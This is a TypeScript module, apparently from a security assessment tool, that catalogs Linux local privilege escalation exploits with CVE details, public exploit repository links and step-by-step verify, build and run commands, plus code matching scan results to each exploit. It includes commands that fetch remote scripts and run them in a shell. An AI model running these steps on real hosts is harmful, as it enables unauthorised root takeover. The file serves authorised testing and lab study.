export type LpeExploitCategory =
  | 'userland-suid'
  | 'userland-package-manager'
  | 'kernel-page-cache'
  | 'kernel-filesystem'
  | 'kernel-netfilter'
  | 'kernel-ebpf'
  | 'kernel-namespace'

export type LpeExploitSource = {
  name: string
  url: string
  role: 'primary' | 'secondary' | 'reference'
  language?: string
  note?: string
}

export type LpeExploitCard = {
  id: string
  templateId?: string
  cves: string[]
  title: string
  category: LpeExploitCategory
  confidence: 'stable' | 'version-sensitive' | 'research'
  detectionHints: string[]
  target: {
    distro?: string
    package?: string
    kernel?: string
    arch?: string
  }
  prerequisites: string[]
  sources: LpeExploitSource[]
  usage?: {
    officialOnline?: {
      project: string
      command: string
      note: string
    }
    bundle?: string[]
  }
  method?: {
    verify: string[]
    build: string[]
    run: string[]
    cleanup: string[]
    notes: string[]
  }
}

export type LpeExploitMatch = {
  matched: boolean
  confidence: 'none' | 'signal' | 'probable'
  reason: string
  evidenceFactIds: string[]
  missingPrerequisites: string[]
}

export const lpeExploitCatalog: LpeExploitCard[] = [
  {
    id: 'cve-2021-4034-pwnkit',
    templateId: 'cve-2021-4034-pwnkit',
    cves: ['CVE-2021-4034'],
    title: 'PwnKit pkexec',
    category: 'userland-suid',
    confidence: 'stable',
    detectionHints: ['CVE-2021-4034', 'PwnKit', 'pkexec', 'policykit', 'polkit'],
    target: {
      distro: 'Ubuntu 18.04/20.04、Debian、CentOS/Fedora 等存在漏洞的 polkit 环境',
      package: 'policykit-1/polkit 漏洞版本，且 pkexec 具备 setuid 权限',
      arch: '优先 x86_64',
    },
    prerequisites: [
      '在授权的隔离环境中以低权限本地用户执行。',
      '确认 /usr/bin/pkexec 存在且具备 setuid 权限。',
      '目标需使用受影响的 polkit 构建，并允许 argc=0 触发路径。',
    ],
    sources: [
      { name: 'ly4k/PwnKit', url: 'https://github.com/ly4k/PwnKit', role: 'primary', language: 'C', note: '桌面端仅展示公开项目链接与 README 使用入口，不再直接导出二进制。' },
      { name: 'berdav/CVE-2021-4034', url: 'https://github.com/berdav/CVE-2021-4034', role: 'secondary', language: 'C', note: '早期公开 PoC，适合交叉复核触发条件。' },
      { name: 'Qualys advisory', url: 'https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034', role: 'reference', note: '漏洞根因、影响范围和修复背景。' },
    ],
    usage: {
      officialOnline: {
        project: 'ly4k/PwnKit',
        command: 'sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"',
        note: '目标能出网时可直接使用官方脚本；执行前先确认这是授权环境和一次性测试主机。',
      },
    },
    method: {
      verify: ['command -v pkexec', 'ls -l /usr/bin/pkexec', 'pkexec --version 2>/dev/null || true'],
      build: ['git clone https://github.com/ly4k/PwnKit.git', 'cd PwnKit && make'],
      run: ['./PwnKit', "./PwnKit 'id'"],
      cleanup: ['remove generated gconv/pkexec working files if the PoC leaves them behind', 'restore VM snapshot after validation'],
      notes: ['GitHub README also documents manual curl download; use the README if shell profile, proxy, or TLS interception affects curl | sh.'],
    },
  },
  {
    id: 'cve-2021-3156-sudo-baron-samedit',
    cves: ['CVE-2021-3156'],
    title: 'sudo Baron Samedit',
    category: 'userland-suid',
    confidence: 'version-sensitive',
    detectionHints: ['CVE-2021-3156', 'Baron Samedit', 'sudo'],
    target: {
      distro: 'Ubuntu 18.04/20.04, Debian, CentOS 7 with vulnerable sudo',
      package: 'sudo < 1.9.5p2, subject to vendor backports',
      arch: 'x86_64',
    },
    prerequisites: [
      'Run in a VM snapshot; exploit reliability depends on distro, glibc, sudo build flags, and heap layout.',
      'Confirm sudo version and target profile before selecting exploit variant.',
    ],
    sources: [
      { name: 'blasty/CVE-2021-3156', url: 'https://github.com/blasty/CVE-2021-3156', role: 'primary', language: 'C', note: 'README 给出 make、列目标和按 target_number 运行的清晰流程。' },
      { name: 'worawit/CVE-2021-3156', url: 'https://github.com/worawit/CVE-2021-3156', role: 'secondary', language: 'Python/C', note: '包含更多发行版/堆布局变体，适合失败后交叉验证。' },
      { name: 'Qualys advisory', url: 'https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit', role: 'reference' },
    ],
    method: {
      verify: ['sudo --version', 'sudoedit -s / 2>&1 | head -5'],
      build: ['git clone https://github.com/blasty/CVE-2021-3156.git', 'cd CVE-2021-3156 && make'],
      run: ['./sudo-hax-me-a-sandwich', './sudo-hax-me-a-sandwich <target_number>'],
      cleanup: ['remove generated libraries and temporary files', 'restore VM snapshot after successful root shell'],
      notes: ['worawit has more variants for study; blasty is simpler for target-list driven attempts.'],
    },
  },
  {
    id: 'cve-2025-32463-sudo-chroot',
    cves: ['CVE-2025-32463'],
    title: 'sudo chroot NSS loading',
    category: 'userland-suid',
    confidence: 'version-sensitive',
    detectionHints: ['CVE-2025-32463', 'sudo chroot', 'sudo -R'],
    target: {
      package: 'sudo 1.9.14 through 1.9.17',
      arch: 'x86_64',
    },
    prerequisites: [
      'The target sudo must support the vulnerable chroot path.',
      'Use a disposable VM because the PoC creates fake chroot/NSS artifacts.',
    ],
    sources: [
      { name: 'mirchr/security-research sudo-chwoot', url: 'https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2025-32463-sudo-chwoot.sh', role: 'primary', language: 'Shell/C', note: 'Stratascale CRU 公开 PoC 脚本。' },
      { name: 'K3ysTr0K3R/CVE-2025-32463-EXPLOIT', url: 'https://github.com/K3ysTr0K3R/CVE-2025-32463-EXPLOIT', role: 'secondary', language: 'Shell/C' },
      { name: 'MohamedKarrab/CVE-2025-32463', url: 'https://github.com/MohamedKarrab/CVE-2025-32463', role: 'secondary', language: 'Shell/C', note: '标注 no gcc required 的变体，使用前核验实现。' },
    ],
    usage: {
      officialOnline: {
        project: 'mirchr/security-research',
        command: 'curl -fsSL https://raw.githubusercontent.com/mirchr/security-research/master/vulnerabilities/CVE-2025-32463-sudo-chwoot.sh -o /tmp/sudo-chwoot.sh && sh /tmp/sudo-chwoot.sh',
        note: '公开原始 PoC 需要本机 gcc；如果目标无编译器，优先查看 MohamedKarrab 变体或自行离线编译。',
      },
    },
    method: {
      verify: ['sudo --version', 'sudo -R invalid invalid 2>&1 | head -5'],
      build: ['git clone https://github.com/K3ysTr0K3R/CVE-2025-32463-EXPLOIT.git', 'cd CVE-2025-32463-EXPLOIT', 'inspect README and choose the variant matching target tooling'],
      run: ['run the packaged PoC only after confirming sudo 1.9.14-1.9.17 and vendor patch status'],
      cleanup: ['remove fake chroot tree and temporary shared libraries', 'restore VM snapshot'],
      notes: ['Treat this as a package-version lab first; distro backports can invalidate the raw upstream version check.'],
    },
  },
  {
    id: 'cve-2017-5618-screen-setuid',
    cves: ['CVE-2017-5618'],
    title: 'GNU screen 4.5.0 setuid',
    category: 'userland-suid',
    confidence: 'research',
    detectionHints: ['CVE-2017-5618', 'screen 4.5.0', 'setuid screen'],
    target: {
      package: 'screen 4.5.0 with setuid bit',
    },
    prerequisites: [
      'Confirm screen is exactly 4.5.0 and setuid-root.',
      'Use an isolated VM; common PoCs may touch /etc/ld.so.preload.',
    ],
    sources: [
      { name: 'RXDarkee/CVE-2017-5618-Screen-4.5.0-Root', url: 'https://github.com/RXDarkee/CVE-2017-5618-Screen-4.5.0-Root', role: 'primary' },
      { name: 'XiphosResearch screen2root', url: 'https://github.com/XiphosResearch/exploits/blob/master/screen2root/README.md', role: 'reference', note: '原始 screen2root 思路和副作用说明。' },
    ],
    method: {
      verify: ['screen --version', 'ls -l "$(command -v screen)"'],
      build: ['git clone https://github.com/RXDarkee/CVE-2017-5618-Screen-4.5.0-Root.git'],
      run: ['read the script first, then run inside the VM snapshot'],
      cleanup: ['inspect and restore /etc/ld.so.preload if touched', 'restore VM snapshot'],
      notes: ['Good lab for understanding SUID helper abuse and dynamic loader side effects.'],
    },
  },
  {
    id: 'cve-2026-41651-packagekit-pack2theroot',
    cves: ['CVE-2026-41651'],
    title: 'PackageKit Pack2TheRoot',
    category: 'userland-package-manager',
    confidence: 'stable',
    detectionHints: ['CVE-2026-41651', 'PackageKit', 'Pack2TheRoot', 'packagekitd'],
    target: {
      distro: 'Ubuntu, Debian, Fedora, Rocky/RHEL-like systems with PackageKit enabled',
      package: 'PackageKit >= 1.0.2 and < 1.3.5, subject to vendor backports',
    },
    prerequisites: [
      'packagekitd must be installed and D-Bus activatable.',
      'Run as an unprivileged local user; no polkit authentication should be required in the vulnerable path.',
    ],
    sources: [
      { name: 'Vozec/CVE-2026-41651', url: 'https://github.com/Vozec/CVE-2026-41651', role: 'primary', language: 'C' },
      { name: '0xBlackash/CVE-2026-41651', url: 'https://github.com/0xBlackash/CVE-2026-41651', role: 'secondary', language: 'Shell', note: 'Shell 版本偏检测/复现，使用前读脚本。' },
      { name: 'dinosn/pack2theroot-lab', url: 'https://github.com/dinosn/pack2theroot-lab', role: 'secondary', language: 'Dockerfile/Shell', note: 'CTF-style Docker lab，适合先复现实验链路。' },
      { name: 'Telekom Security write-up', url: 'https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html', role: 'reference' },
      { name: 'PackageKit advisory', url: 'https://github.com/PackageKit/PackageKit/security/advisories/GHSA-f55j-vvr9-69xv', role: 'reference' },
    ],
    method: {
      verify: ['pkcon --version || true', 'dpkg -l packagekit 2>/dev/null || rpm -qa | grep -i PackageKit', 'systemctl status packagekit --no-pager || true'],
      build: ['sudo apt install -y libglib2.0-dev build-essential || sudo dnf install -y glib2-devel gcc make', 'git clone https://github.com/Vozec/CVE-2026-41651.git', 'cd CVE-2026-41651 && make'],
      run: ['./cve-2026-41651'],
      cleanup: ['remove /tmp/.suid_bash* if created', 'journalctl -u packagekit --since "10 min ago"', 'restore VM snapshot'],
      notes: ['This is a strong candidate for your current generic-lpe scan result because KubeTrail already emits PackageKit findings.'],
    },
  },
  {
    id: 'cve-2022-0847-dirty-pipe',
    cves: ['CVE-2022-0847'],
    title: 'Dirty Pipe',
    category: 'kernel-page-cache',
    confidence: 'stable',
    detectionHints: ['CVE-2022-0847', 'Dirty Pipe'],
    target: {
      kernel: 'Linux 5.8 through 5.16.11 heuristic range',
      arch: 'x86_64',
    },
    prerequisites: [
      'Kernel must be in an affected build; vendor patched kernels can keep the same base version.',
      'Use a snapshot because PoCs overwrite page cache and some variants alter credential files or SUID binaries.',
    ],
    sources: [
      { name: 'Arinerron/CVE-2022-0847-DirtyPipe-Exploit', url: 'https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit', role: 'primary', language: 'C' },
      { name: 'AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits', url: 'https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits', role: 'secondary', language: 'C' },
      { name: 'Max Kellermann write-up', url: 'https://dirtypipe.cm4all.com/', role: 'reference' },
    ],
    method: {
      verify: ['uname -a', 'sysctl kernel.unprivileged_userns_clone 2>/dev/null || true'],
      build: ['git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git', 'cd CVE-2022-0847-DirtyPipe-Exploit && make || gcc exploit.c -o exploit'],
      run: ['./exploit'],
      cleanup: ['reboot the VM or restore snapshot after validation'],
      notes: ['Use this to study deterministic page-cache write primitives before moving to Copy Fail and Dirty Frag.'],
    },
  },
  {
    id: 'cve-2016-5195-dirty-cow',
    cves: ['CVE-2016-5195'],
    title: 'Dirty COW',
    category: 'kernel-page-cache',
    confidence: 'version-sensitive',
    detectionHints: ['CVE-2016-5195', 'Dirty COW', 'Legacy Dirty COW'],
    target: {
      kernel: 'Linux kernels before the common 4.8.3 fix point',
    },
    prerequisites: [
      'Use an intentionally old distro/kernel VM.',
      'Prefer a disposable snapshot because classic PoCs often modify /etc/passwd or SUID binaries.',
    ],
    sources: [
      { name: 'firefart/dirtycow', url: 'https://github.com/firefart/dirtycow', role: 'primary', language: 'C' },
      { name: 'gbonacini/CVE-2016-5195', url: 'https://github.com/gbonacini/CVE-2016-5195', role: 'secondary', language: 'C++' },
      { name: 'Red Hat Dirty COW advisory', url: 'https://access.redhat.com/security/vulnerabilities/DirtyCow', role: 'reference' },
    ],
    method: {
      verify: ['uname -a', 'cat /proc/version'],
      build: ['git clone https://github.com/firefart/dirtycow.git', 'cd dirtycow && gcc -pthread dirty.c -o dirty -lcrypt'],
      run: ['./dirty'],
      cleanup: ['restore /etc/passwd from the PoC backup if applicable', 'restore VM snapshot'],
      notes: ['Keep this as a historical race-condition lab; reliability is lower than Dirty Pipe.'],
    },
  },
  {
    id: 'cve-2026-31431-copy-fail',
    cves: ['CVE-2026-31431'],
    title: 'Copy Fail AF_ALG',
    category: 'kernel-page-cache',
    confidence: 'research',
    detectionHints: ['CVE-2026-31431', 'Copy Fail', 'AF_ALG'],
    target: {
      kernel: 'Kernel ranges matching KubeTrail Copy Fail heuristic',
      arch: 'x86_64',
    },
    prerequisites: [
      'CONFIG_CRYPTO_USER_API_AEAD and CONFIG_CRYPTO_AUTHENC should be enabled.',
      'Run only in an isolated VM snapshot; this class contaminates page cache state.',
    ],
    sources: [
      { name: 'theori-io/copy-fail-CVE-2026-31431', url: 'https://github.com/theori-io/copy-fail-CVE-2026-31431', role: 'primary', language: 'Python', note: '官方公开 PoC，README 标注测试发行版/内核。' },
      { name: 'Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC', url: 'https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC', role: 'secondary', language: 'Python/Shell', note: 'Kubernetes 容器逃逸场景 PoC，和本地 LPE 分开评估。' },
      { name: 'Copy Fail project page', url: 'https://copy.fail/', role: 'reference' },
    ],
    method: {
      verify: ['uname -a', 'zgrep -E "CONFIG_CRYPTO_USER_API_AEAD|CONFIG_CRYPTO_AUTHENC" /proc/config.gz /boot/config-$(uname -r) 2>/dev/null'],
      build: ['git clone https://github.com/theori-io/copy-fail-CVE-2026-31431.git'],
      run: ['cd copy-fail-CVE-2026-31431 && python3 copy_fail_exp.py'],
      cleanup: ['reboot or restore VM snapshot after validation'],
      notes: ['Treat as high-impact research material; do not run on shared hosts.'],
    },
  },
  {
    id: 'cve-2026-43284-43500-dirty-frag',
    cves: ['CVE-2026-43284', 'CVE-2026-43500'],
    title: 'Dirty Frag xfrm/RxRPC',
    category: 'kernel-page-cache',
    confidence: 'research',
    detectionHints: ['CVE-2026-43284', 'CVE-2026-43500', 'Dirty Frag', 'xfrm', 'RxRPC'],
    target: {
      kernel: 'Kernel ranges matching KubeTrail Dirty Frag ESP/RxRPC heuristics',
      arch: 'x86_64',
    },
    prerequisites: [
      'Need xfrm/ESP or RxRPC reachability plus user namespace or CAP_SYS_ADMIN prerequisites.',
      'Use a disposable VM; README notes page cache contamination after execution.',
    ],
    sources: [
      { name: 'V4bel/dirtyfrag', url: 'https://github.com/V4bel/dirtyfrag', role: 'primary', language: 'C' },
      { name: 'Dirty Frag project page', url: 'https://www.dirtyfrag.tech/', role: 'reference' },
      { name: 'Wiz Dirty Frag write-up', url: 'https://www.wiz.io/blog/dirty-frag-linux-kernel-local-privilege-escalation-via-esp-and-rxrpc', role: 'reference' },
    ],
    method: {
      verify: ['uname -a', 'lsmod | egrep "esp4|esp6|rxrpc|xfrm" || true', 'sysctl kernel.unprivileged_userns_clone user.max_user_namespaces 2>/dev/null || true'],
      build: ['git clone https://github.com/V4bel/dirtyfrag.git', 'cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil'],
      run: ['./exp'],
      cleanup: ['sudo sh -c "echo 3 > /proc/sys/vm/drop_caches" if already root', 'reboot or restore VM snapshot'],
      notes: ['Use after Dirty Pipe/Copy Fail to compare page-cache write bug classes.'],
    },
  },
  {
    id: 'cve-2023-0386-overlayfs',
    cves: ['CVE-2023-0386'],
    title: 'OverlayFS FUSE copy-up',
    category: 'kernel-filesystem',
    confidence: 'version-sensitive',
    detectionHints: ['CVE-2023-0386', 'OverlayFS', 'FUSE'],
    target: {
      distro: 'Ubuntu 22.04-style lab with vulnerable kernel',
      kernel: 'Linux 5.11 through 6.2 heuristic range',
    },
    prerequisites: [
      'OverlayFS, FUSE, and unprivileged user namespaces should be reachable.',
      'Run in a snapshot because PoCs create mounts and temporary SUID artifacts.',
    ],
    sources: [
      { name: 'sxlmnwb/CVE-2023-0386', url: 'https://github.com/sxlmnwb/CVE-2023-0386', role: 'primary', language: 'C' },
      { name: 'v4resk CVE-2023-0386 notes', url: 'https://github.com/v4resk/red-book/blob/main/redteam/privilege-escalation/linux/kernel-exploits/overlayfs-exploits/cve-2023-0386-overlayfs.md', role: 'reference' },
      { name: 'Wiz CVE note', url: 'https://www.wiz.io/vulnerability-database/cve/cve-2023-0386', role: 'reference' },
    ],
    method: {
      verify: ['uname -a', 'lsmod | egrep "overlay|fuse" || true', 'sysctl kernel.unprivileged_userns_clone user.max_user_namespaces 2>/dev/null || true'],
      build: ['git clone https://github.com/sxlmnwb/CVE-2023-0386.git', 'cd CVE-2023-0386 && make all'],
      run: ['./fuse ./ovlcap/lower ./gc &', './exp'],
      cleanup: ['kill background fuse helper', 'unmount temporary mount points if left behind', 'restore VM snapshot'],
      notes: ['Good bridge between namespace prerequisites and filesystem copy-up behavior.'],
    },
  },
  {
    id: 'cve-2021-3493-ubuntu-overlayfs',
    cves: ['CVE-2021-3493'],
    title: 'Ubuntu OverlayFS file capabilities',
    category: 'kernel-filesystem',
    confidence: 'stable',
    detectionHints: ['CVE-2021-3493', 'Ubuntu OverlayFS'],
    target: {
      distro: 'Ubuntu 14.04 ESM through 20.10 era vulnerable kernels',
      kernel: 'Ubuntu kernel with vulnerable OverlayFS patch',
    },
    prerequisites: [
      'Use Ubuntu-specific vulnerable kernel; upstream generic kernel version alone is not enough.',
      'OverlayFS and unprivileged namespace behavior must match the advisory.',
    ],
    sources: [
      { name: 'puckiestyle/CVE-2021-3493', url: 'https://github.com/puckiestyle/CVE-2021-3493', role: 'primary', language: 'C', note: 'README 给出受影响 Ubuntu 版本和 gcc/运行步骤。' },
      { name: 'briskets/CVE-2021-3493', url: 'https://github.com/briskets/CVE-2021-3493', role: 'secondary', language: 'C' },
      { name: 'Ubuntu CVE page', url: 'https://ubuntu.com/security/CVE-2021-3493', role: 'reference' },
    ],
    method: {
      verify: ['uname -a', 'cat /etc/os-release', 'lsmod | grep overlay || true'],
      build: ['git clone https://github.com/puckiestyle/CVE-2021-3493.git', 'cd CVE-2021-3493 && gcc exploit.c -o exploit'],
      run: ['./exploit'],
      cleanup: ['remove temporary overlay directories', 'restore VM snapshot'],
      notes: ['Best used as an Ubuntu-specific OverlayFS comparison case before CVE-2023-0386.'],
    },
  },
  {
    id: 'cve-2022-0185-fs-context',
    cves: ['CVE-2022-0185'],
    title: 'fs_context heap overflow',
    category: 'kernel-namespace',
    confidence: 'version-sensitive',
    detectionHints: ['CVE-2022-0185', 'fs_context'],
    target: {
      kernel: 'Linux 5.4 through 5.16.2 heuristic range',
    },
    prerequisites: [
      'Need user namespaces or CAP_SYS_ADMIN depending on distro hardening.',
      'Exploit reliability varies by kernel build and heap layout.',
    ],
    sources: [
      { name: 'Crusaders-of-Rust/CVE-2022-0185', url: 'https://github.com/Crusaders-of-Rust/CVE-2022-0185', role: 'primary', language: 'C', note: '原研究团队公开 demo，区分 Ubuntu FUSE 与 kCTF/Kubernetes 版本。' },
      { name: 'chenaotian/CVE-2022-0185', url: 'https://github.com/chenaotian/CVE-2022-0185', role: 'secondary', language: 'C/Docker', note: '包含 Docker 与中文分析材料。' },
      { name: 'willsroot write-up', url: 'https://www.willsroot.io/2022/01/cve-2022-0185.html', role: 'reference' },
    ],
    method: {
      verify: ['uname -a', 'sysctl kernel.unprivileged_userns_clone user.max_user_namespaces 2>/dev/null || true'],
      build: ['git clone https://github.com/Crusaders-of-Rust/CVE-2022-0185.git', 'cd CVE-2022-0185 && make'],
      run: ['read README first; choose exploit_fuse for Ubuntu lab or exploit_kctf for matching kCTF/Kubernetes lab'],
      cleanup: ['restore VM snapshot after validation'],
      notes: ['Keep this as a second-wave kernel heap lab after deterministic page-cache primitives.'],
    },
  },
  {
    id: 'cve-2024-1086-nftables',
    cves: ['CVE-2024-1086'],
    title: 'nf_tables netfilter UAF',
    category: 'kernel-netfilter',
    confidence: 'version-sensitive',
    detectionHints: ['CVE-2024-1086', 'nf_tables', 'netfilter'],
    target: {
      kernel: 'Exploit author targets many kernels from 5.14 through 6.6, with patched-branch exclusions',
      arch: 'x86_64',
    },
    prerequisites: [
      'CONFIG_NF_TABLES and unprivileged user namespaces should be enabled.',
      'Kernel 6.4+ with CONFIG_INIT_ON_ALLOC_DEFAULT_ON may not work according to the PoC README.',
    ],
    sources: [
      { name: 'Notselwyn/CVE-2024-1086', url: 'https://github.com/Notselwyn/CVE-2024-1086', role: 'primary', language: 'C' },
      { name: 'Flipping Pages write-up', url: 'https://pwning.tech/nftables/', role: 'reference' },
    ],
    method: {
      verify: ['uname -a', 'lsmod | grep nf_tables || true', 'sysctl kernel.unprivileged_userns_clone user.max_user_namespaces 2>/dev/null || true'],
      build: ['git clone https://github.com/Notselwyn/CVE-2024-1086.git', 'cd CVE-2024-1086 && make'],
      run: ['./exploit'],
      cleanup: ['restore VM snapshot; reboot if networking becomes unstable'],
      notes: ['Good lab for network namespace plus netfilter exploitation prerequisites.'],
    },
  },
  {
    id: 'cve-2017-16995-ebpf',
    cves: ['CVE-2017-16995'],
    title: 'eBPF verifier 2017',
    category: 'kernel-ebpf',
    confidence: 'version-sensitive',
    detectionHints: ['CVE-2017-16995', 'eBPF verifier', 'CONFIG_BPF_SYSCALL'],
    target: {
      kernel: 'Linux 4.4 through 4.14.8 heuristic range',
      arch: 'x86_64',
    },
    prerequisites: [
      'CONFIG_BPF_SYSCALL enabled and kernel.unprivileged_bpf_disabled=0.',
      'Use an old Ubuntu 16.04-style lab kernel.',
    ],
    sources: [
      { name: 'gugronnier/CVE-2017-16995', url: 'https://github.com/gugronnier/CVE-2017-16995', role: 'primary', language: 'C' },
      { name: 'ph4ntonn/CVE-2017-16995', url: 'https://github.com/ph4ntonn/CVE-2017-16995', role: 'secondary', language: 'C' },
    ],
    method: {
      verify: ['uname -a', 'sysctl kernel.unprivileged_bpf_disabled 2>/dev/null || true', 'zgrep CONFIG_BPF_SYSCALL /proc/config.gz /boot/config-$(uname -r) 2>/dev/null'],
      build: ['git clone https://github.com/gugronnier/CVE-2017-16995.git', 'cd CVE-2017-16995 && gcc exploit.c -o exploit'],
      run: ['./exploit'],
      cleanup: ['restore VM snapshot after validation'],
      notes: ['Use for verifier-era eBPF fundamentals before ALU32 CVE-2021-3490.'],
    },
  },
  {
    id: 'cve-2021-3490-ebpf-alu32',
    cves: ['CVE-2021-3490'],
    title: 'eBPF ALU32 verifier',
    category: 'kernel-ebpf',
    confidence: 'version-sensitive',
    detectionHints: ['CVE-2021-3490', 'eBPF ALU32', 'CONFIG_BPF_SYSCALL'],
    target: {
      kernel: 'Linux 5.7 through 5.11 heuristic range',
      arch: 'x86_64',
    },
    prerequisites: [
      'CONFIG_BPF_SYSCALL enabled and unprivileged BPF allowed.',
      'Use a lab VM because exploit success depends on kernel build details.',
    ],
    sources: [
      { name: 'chompie1337/Linux_LPE_eBPF_CVE-2021-3490', url: 'https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490', role: 'primary', language: 'C', note: 'README 给出 groovy/hirsute 构建目标和运行入口。' },
      { name: 'Rapid7 Metasploit CVE-2021-3490 source', url: 'https://github.com/rapid7/metasploit-framework/tree/master/external/source/exploits/CVE-2021-3490/Linux_LPE_eBPF_CVE-2021-3490', role: 'secondary', language: 'C' },
    ],
    method: {
      verify: ['uname -a', 'sysctl kernel.unprivileged_bpf_disabled 2>/dev/null || true', 'zgrep CONFIG_BPF_SYSCALL /proc/config.gz /boot/config-$(uname -r) 2>/dev/null'],
      build: ['git clone https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490.git', 'cd Linux_LPE_eBPF_CVE-2021-3490', 'make groovy # Ubuntu 20.04.02/20.10', 'make hirsute # Ubuntu 21.04'],
      run: ['bin/exploit.bin'],
      cleanup: ['restore VM snapshot after validation'],
      notes: ['This is more useful as eBPF verifier study material than a first-pass one-click lab.'],
    },
  },
]

export function lpeExploitMatchesText(card: LpeExploitCard, text: string): boolean {
  const haystack = text.toLowerCase()
  return [...card.cves, ...card.detectionHints].some(item => haystack.includes(item.toLowerCase()))
}

export function matchLpeExploit(card: LpeExploitCard, doc: any): LpeExploitMatch {
  if (!doc) {
    return noExploitMatch('未加载扫描结果')
  }
  const findingMatch = matchLpeFinding(card, doc)
  if (card.id === 'cve-2021-4034-pwnkit') {
    return matchPwnKit(doc, findingMatch)
  }
  if (findingMatch) {
    return findingMatch
  }
  const factMatch = matchLpeExploitFacts(card, doc)
  if (factMatch) {
    return factMatch
  }
  return noExploitMatch('当前扫描结果未命中该漏洞指纹')
}

export function lpeExploitSearchText(card: LpeExploitCard): string {
  return [
    card.id,
    card.title,
    card.category,
    card.confidence,
    card.cves.join(' '),
    card.detectionHints.join(' '),
    card.target.distro ?? '',
    card.target.package ?? '',
    card.target.kernel ?? '',
    card.sources.map(source => source.name).join(' '),
  ].join(' ').toLowerCase()
}

function matchPwnKit(doc: any, findingMatch: LpeExploitMatch | null): LpeExploitMatch {
  const evidence = new Set<string>()
  if (findingMatch) {
    for (const id of findingMatch.evidenceFactIds) evidence.add(id)
  }

  const facts = factMap(doc)
  const pkexec = suidTool(facts, 'pkexec')
  if (pkexec?.setuid) evidence.add('lpe.suid_tools')
  const pkexecUsable = suidToolUsable(facts, 'pkexec') && suidTransitionsLikely(facts)
  const packages = ['policykit-1', 'polkit', 'polkitd']
    .map(name => ({ name, version: packageVersion(facts, name) }))
    .filter(item => item.version)
  const vulnerablePackages = packages.filter(item => pwnKitPackagePotentiallyVulnerable(facts, item.version).vulnerable)
  if (packages.length > 0) evidence.add('lpe.packages')
  if (facts.has('lpe.status')) evidence.add('lpe.status')

  const missing: string[] = []
  if (!pkexec?.setuid) missing.push('/usr/bin/pkexec setuid-root signal')
  if (pkexec?.setuid && !pkexecUsable) missing.push('usable SUID transition without nosuid/NoNewPrivs blocking')
  if (packages.length === 0) missing.push('polkit/policykit package version evidence')

  if (findingMatch) {
    return {
      matched: true,
      confidence: findingMatch.confidence,
      reason: findingMatch.reason,
      evidenceFactIds: Array.from(evidence),
      missingPrerequisites: missing,
    }
  }

  if (!lpeFactsEligible(facts)) {
    return noExploitMatch('当前目标为 root 或 LPE 扫描被跳过')
  }

  if (pkexec?.setuid && vulnerablePackages.length > 0) {
    return {
      matched: true,
      confidence: pkexecUsable ? 'probable' : 'signal',
      reason: pkexecUsable
        ? `发现 setuid pkexec，且 ${vulnerablePackages.map(item => `${item.name} ${item.version}`).join(', ')} 低于已知修复版本`
        : `发现 setuid pkexec 和易受影响 polkit 包，但当前 mount/no_new_privs 状态可能阻断 SUID 提权`,
      evidenceFactIds: Array.from(evidence),
      missingPrerequisites: pkexecUsable ? [] : missing,
    }
  }

  if (pkexecUsable && packages.length === 0) {
    return {
      matched: true,
      confidence: 'signal',
      reason: '发现 setuid pkexec，但扫描结果未包含 polkit/policykit 包版本',
      evidenceFactIds: Array.from(evidence),
      missingPrerequisites: missing,
    }
  }

  if (pkexec?.setuid && packages.length > 0) {
    return noExploitMatch('发现 setuid pkexec，但 polkit/policykit 版本未落入已知漏洞范围')
  }

  return noExploitMatch('未发现 setuid pkexec 与易受影响 polkit 包版本组合')
}

function noExploitMatch(reason: string): LpeExploitMatch {
  return { matched: false, confidence: 'none', reason, evidenceFactIds: [], missingPrerequisites: [] }
}

function matchLpeFinding(card: LpeExploitCard, doc: any): LpeExploitMatch | null {
  const findings = Array.isArray(doc?.findings) ? doc.findings : []
  const finding = findings.find((item: any) => {
    if (String(item?.category ?? '') !== 'lpe') return false
    const text = `${item?.title ?? ''} ${item?.description ?? ''}`.toLowerCase()
    return card.cves.some(cve => text.includes(cve.toLowerCase())) ||
      card.detectionHints.some(hint => text.includes(hint.toLowerCase())) ||
      text.includes(card.title.toLowerCase())
  })
  if (!finding) return null
  const severity = String(finding?.severity ?? '').toLowerCase()
  const explicitConfidence = normalizeFindingConfidence(finding?.confidence)
  const reason = String(finding?.description || finding?.title || '服务端 finding 命中该攻击面')
  return {
    matched: true,
    confidence: explicitConfidence || (lpeFindingLooksHeuristic(`${finding?.title ?? ''} ${reason}`) ? 'signal' : severity === 'critical' || severity === 'high' ? 'probable' : 'signal'),
    reason,
    evidenceFactIds: splitEvidence(finding?.evidence),
    missingPrerequisites: [],
  }
}

function normalizeFindingConfidence(value: any): 'signal' | 'probable' | null {
  const confidence = String(value ?? '').toLowerCase()
  return confidence === 'signal' || confidence === 'probable' ? confidence : null
}

function lpeFindingLooksHeuristic(text: string): boolean {
  const lowered = text.toLowerCase()
  return [
    'heuristic',
    'vendor backport',
    'vendor backports',
    'advisory status',
    'version-only',
    'kernel range',
    'upstream range',
    'pre-fix branch',
    'was not confirmed',
  ].some(needle => lowered.includes(needle))
}

function matchLpeExploitFacts(card: LpeExploitCard, doc: any): LpeExploitMatch | null {
  const facts = factMap(doc)
  if (!lpeFactsEligible(facts)) return null
  const kernel = kernelVersionFromFacts(facts)
  const userns = usernsState(facts)
  const hasCAPSysAdmin = capEffectiveHas(facts, 21)
  const bpfEnabled = kernelConfigEnabled(facts, 'CONFIG_BPF_SYSCALL').enabled
  const unprivBPFEnabled = sysctlEquals(facts, 'kernel.unprivileged_bpf_disabled', '0')

  switch (card.id) {
    case 'cve-2021-3156-sudo-baron-samedit': {
      const version = packageVersion(facts, 'sudo')
